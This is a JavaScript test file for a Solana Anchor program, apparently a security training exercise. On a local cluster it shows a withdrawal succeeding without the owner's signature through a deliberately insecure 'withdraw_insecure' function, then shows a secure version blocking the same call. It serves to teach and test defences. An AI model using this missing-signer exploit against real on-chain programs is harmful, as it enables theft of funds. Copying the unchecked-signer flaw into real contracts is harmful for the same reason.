const anchor = require("@coral-xyz/anchor");
const { assert } = require("chai");

describe("🛡️ SECURITY DOJO: LIVE EXPLOIT TEST", () => {
  // Configure the client to use the local cluster.
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.SecuritySecrets;

  // Generate random keys for the vault and hacker
  const vault = anchor.web3.Keypair.generate();
  const hacker = anchor.web3.Keypair.generate();

  it("📝 Setup: Prepare the Actors", async () => {
    console.log(`--- 😈 HACKER: ${hacker.publicKey.toBase58()} ---`);
    console.log(`--- 🏦 VAULT: ${vault.publicKey.toBase58()} ---`);
  });

  it("🥷 EXPLOIT: Stealing funds via 'withdraw_insecure'", async () => {
    console.log("\n--- 📟 INITIATING ATTACK... ---");
    
    try {
      const amountToSteal = new anchor.BN(50000);

      // ✨ THE EXPLOIT: 
      // We pass the hacker's Public Key, but we DO NOT sign with their Private Key.
      // Your local wallet (provider) pays the gas fee, but the 'user' account is just data.
      // Since the Rust code doesn't check 'user.is_signer', this WILL succeed.
      
      await program.methods.withdrawInsecure(amountToSteal)
        .accounts({
          vault: vault.publicKey,
          user: hacker.publicKey, 
        })
        // NOTICE: No .signers([hacker]) here! 
        .rpc();

      console.log("💰 [SUCCESS] VULNERABILITY EXPLOITED! FUNDS STOLEN.");
      console.log("   (Transaction succeeded WITHOUT the user's signature!)");

    } catch (err) {
      console.log("❌ Attack Failed:", err);
      throw new Error("The exploit should have worked!");
    }
  });

  it("🛡️ DEFENSE: Trying the same attack on 'withdraw_secure'", async () => {
    console.log("\n--- 🛡️ TESTING SECURE PERIMETER ---");
    const amountToSteal = new anchor.BN(50000);

    try {
      await program.methods.withdrawSecure(amountToSteal)
        .accounts({
          vault: vault.publicKey,
          user: hacker.publicKey,
        })
        // Even if we don't sign here, Anchor checks the IDL and will throw an error 
        // because 'withdraw_secure' DEMANDS a Signer.
        .rpc();
        
      console.log("⚠️ Secure function allowed withdrawal (Check your logic!)");
    } catch (err) {
      // We expect an error because we didn't sign!
      console.log("✅ [BLOCKED] SECURE FUNCTION REJECTED THE ATTACK.");
      console.log("   (Anchor blocked the transaction because a signature was missing)");
    }
  });
});